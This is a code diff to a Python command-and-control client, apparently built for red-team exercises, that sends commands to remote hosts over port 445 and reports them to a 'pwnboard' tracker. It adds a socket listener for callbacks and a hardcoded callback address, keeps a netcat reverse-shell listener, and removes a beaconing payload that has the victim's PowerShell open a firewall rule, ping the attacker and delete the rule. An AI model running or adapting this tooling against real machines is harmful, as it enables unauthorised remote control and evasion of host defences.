@@ -21,6 +21,7 @@ baseparams = {"MODE": None, "FILE": None, "XOR": True, "PWNBOARD": None}
 
 cmdparams = {
     "RHOST": None,
+    "LHOST": None,
     "RPORT": 445,
     "COMMAND": "msg * hi",
     "TRANSPORT": "TCP",
@@ -58,8 +59,22 @@ def updatePwnboard(ip, mode):
     except Exception as E:
         print(E)
 
+def pgListen(params):
+    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    soc.bind((params["LHOST"], 443))
 
-def listen(params):
+    soc.listen(9)
+
+    conn, addr = soc.accept()
+    print(addr[0], addr[1])
+    while True:
+        data = conn.recv(1024)
+        if not data:
+            break
+        print(data)
+
+
+def shListen(params):
     try:
         nc = nclib.Netcat(listen=(params["LHOST"], 443))
         nc.interact() # TODO does the connection close cleanly?
@@ -76,33 +91,6 @@ def listen(params):
     if baseparams["PWNBOARD"] is not None:
         updatePwnboard(params["RHOST"], "shell")
     print(colored("\n[*] Shell closed.\n", "cyan"))
-
-def pingListen():
-    print(colored(f"[*] Waiting 15 seconds for callbacks.\n", "cyan"))
-    pkts = scapy.sniff( iface=interface, filter="icmp", timeout=15) 
-    tCallbacks = []
-
-    for packet in pkts:
-        if str(packet.getlayer(scapy.ICMP).type) == "8":
-            tCallbacks.append(packet[scapy.IP].src)
-
-    fCallbacks = list(dict.fromkeys(tCallbacks))
-    for ip in fCallbacks:
-        print(colored(f"[+] Ping received from: {ip}\n", "green"))
-        updatePwnboard(ip, "beacon")
-
-
-def initPing(params):
-    if interface is None:
-        return None
-
-    import netifaces as ni
-    try:
-        targetIP = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
-    except TypeError:
-        return None
-    pingmode = "FC-CM-{}\00".format("powershell -c netsh adv f a r dir=out protocol=icmpv4 action=allow name=\"y\"; ping " + targetIP + " -n 1; netsh adv f delete rule name=\"y\"")
-    return pingmode
 
 def validGroupKey():
     key = groupparams["GROUP"]
@@ -250,7 +238,7 @@ def executeShell(send=False):
         print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "cyan"))
         execute(plaintext, shellparams)
         if not send:
-            listen(shellparams)
+            shListen(shellparams)
 
 def executeCmd():
     if verify(cmdparams):
@@ -275,13 +263,10 @@ def executeGroup():
 
 def executePing():
     if baseparams["MODE"] == "CMD" and verify(cmdparams):
-        plaintext = initPing(cmdparams)
-        if plaintext is None:
-            print(colored("[!] Interface not set correctly.\n", "yellow"))
-            return
-        t = multiprocessing.Process(target=pingListen)
+        plaintext = "FC-PG-192.168.10.174\00"
+        t = multiprocessing.Process(target=pgListen, args=(cmdparams,))
         t.start()
-        time.sleep(2)
+        # time.sleep(2)
         execute(plaintext, cmdparams)
         t.join()
     elif baseparams["MODE"] == "GROUP" and verify(groupparams):
